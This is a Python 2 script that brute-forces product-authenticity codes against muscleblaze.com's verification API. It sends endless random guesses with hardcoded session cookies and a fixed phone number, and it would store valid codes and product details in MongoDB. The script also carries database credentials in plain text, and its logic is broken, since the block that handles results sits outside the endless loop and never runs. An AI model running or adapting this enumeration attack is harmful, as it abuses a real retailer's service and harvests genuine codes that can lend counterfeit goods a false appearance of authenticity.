import os
import requests
import string
import random
from mongoengine import *

def code_gen(size=6,chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


cookies = {
    '__cfduid': 'd607431b3f03da62bc32af5a8f3c4dfdc1532536001',
    '_gr_test_url': '1',
    '_gr_ep': '/',
    '_gr_er': 'https://www.google.com/',
    'G_ENABLED_IDPS': 'google',
    'AWSALB': 'RqgkuGYglJRPMa8g/SiXsiaiBsyroP5qEtDShPCpD/ydI/vRjgPOBZaoTfv9AEOxytmhqWl4yN1kruLvvtPbGxZxmz6YWu9PXfvppj5cs3mVuc2xDEa5RBbMyFQD',
    'JSESSIONID': '3280B87F8DD9F12560C304528004E243',
    'SERVERIDN': 'DD',
    '_vwo_uuid_v2': 'DD5DE35BB994C84548F13DE375356F13A|98b7fcd056191ddaaa3df5f317d74512',
    'bunting_visit_cookie': '1532536010760g_9jEbQtrvtkO5P52zIR_VhNM79qRlKhA6Y.L',
    'mktz_sess': 'ses1761626587ion',
    'mktz_client': '%7B%22is_returning%22%3A0%2C%22uid%22%3A%221359838354287513744%22%2C%22session%22%3A%22ses1761626587ion%22%2C%22views%22%3A5%2C%22referer_url%22%3A%22https%3A//www.google.com/%22%2C%22referer_domain%22%3A%22www.google.com%22%2C%22referer_type%22%3A%22organic%22%2C%22visits%22%3A1%2C%22landing%22%3A%22https%3A//www.muscleblaze.com/%22%2C%22enter_at%22%3A%222018-07-25%7C21%3A56%3A52%22%2C%22first_visit%22%3A%222018-07-25%7C21%3A56%3A52%22%2C%22last_visit%22%3A%222018-07-25%7C21%3A56%3A52%22%2C%22last_variation%22%3A%22%22%2C%22utm_source%22%3Afalse%2C%22utm_term%22%3Afalse%2C%22utm_campaign%22%3Afalse%2C%22utm_content%22%3Afalse%2C%22utm_medium%22%3Afalse%2C%22consent%22%3A%22%22%7D',
    '_ga': 'GA1.2.369248404.1532536019',
    '_gid': 'GA1.2.1018521523.1532536019',
    '_gat_UA-21820217-17': '1',
    'bunting_form_data': 'code%25%2F%25d%25%7C%25subscribedPromotions%25%2F%25on%25%7C%25',
}

headers = {
    'Host': 'www.muscleblaze.com',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-GB,en;q=0.5',
    'Referer': 'https://www.muscleblaze.com/',
    'Content-Type': 'application/json; charset=utf-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
}

class Post(Document):
  code = StringField(required=False, max_length=200, unique=True)
  expdate = StringField(required=False, max_length=200)
  product_name = StringField(required=False, max_length=200)
  batch_no = StringField(required=False, max_length=200, unique=True)
  mfgdate = StringField(required=False, max_length=200)

count = 0
while True:
  code = '"#H'+code_gen()+'"'
  print "trying: "+code
  print "tried: "+ str(count) 
  data = '{"code":'+code+',"phoneNumber":"9997828555","name":null,"email":null,"subscribedPromotions":false}'
  try:
    response = requests.post('https://www.muscleblaze.com/api/auth/product', headers=headers, cookies=cookies, data=data)
    r = response.json()
  except:
    print "no response"
    continue
  count = count +1
print r
if r['results']['status'] == 'valid':
      print 'success'
      code = r['results']['code']
      expdate = r['results']['expDate']
      product_name = r['results']['productName']
      batch_no = r['results']['batchNumber']
      mfgdate = r['results']['mfgDate']
      post1 = Post(code=code, expdate=expdate, product_name=product_name, batch_no=batch_no, mfgdate=mfgdate)
      try:
        con = connect(host="mongodb://migrationuser:mygrationtool@localhost:27017/mblaze?authSource=admin")
        post1.save()
      except Exception as e:
        print e
      finally:
        con.close()


        
